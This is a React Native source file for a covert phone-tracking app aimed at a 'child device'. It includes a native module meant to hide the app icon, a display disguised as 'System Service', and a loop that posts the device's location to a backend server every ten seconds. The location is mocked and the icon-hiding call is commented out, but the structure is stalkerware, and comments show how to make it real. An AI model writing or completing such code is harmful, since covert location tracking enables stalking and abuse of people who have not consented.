import React, { useEffect } from 'react';
import { StyleSheet, Text, View, NativeModules, Platform } from 'react-native';

const { StealthModule } = NativeModules;

// Configuration
const BACKEND_URL = 'http://192.168.1.100:3001/api/location'; // Replace with your actual backend IP
const DEVICE_ID = 'android-child-device-01';

export default function App() {
  useEffect(() => {
    // 1. Activate Stealth Mode (Hide Icon)
    // This calls the native module we created.
    if (Platform.OS === 'android' && StealthModule) {
      // In a real scenario, you might want to delay this or trigger it via a secret code
      // StealthModule.hideAppIcon();
      console.log('Stealth Mode Activated: App icon hidden (simulation)');
    }

    // 2. Start Background Location Tracking
    // In a real app, use expo-location or react-native-background-geolocation
    const trackLocation = async () => {
      try {
        // Mock Location Data
        const mockLocation = {
          deviceId: DEVICE_ID,
          latitude: 40.7128 + (Math.random() - 0.5) * 0.01,
          longitude: -74.0060 + (Math.random() - 0.5) * 0.01,
        };

        await fetch(BACKEND_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(mockLocation),
        });
        console.log('Location sent:', mockLocation);
      } catch (error) {
        console.error('Failed to send location:', error);
      }
    };

    // Poll every 10 seconds
    const intervalId = setInterval(trackLocation, 10000);

    return () => clearInterval(intervalId);
  }, []);

  return (
    <View style={styles.container}>
      <Text>System Service</Text>
      <Text style={styles.hidden}>Running in background...</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
    alignItems: 'center',
    justifyContent: 'center',
  },
  hidden: {
    color: '#ccc',
    fontSize: 10,
  },
});
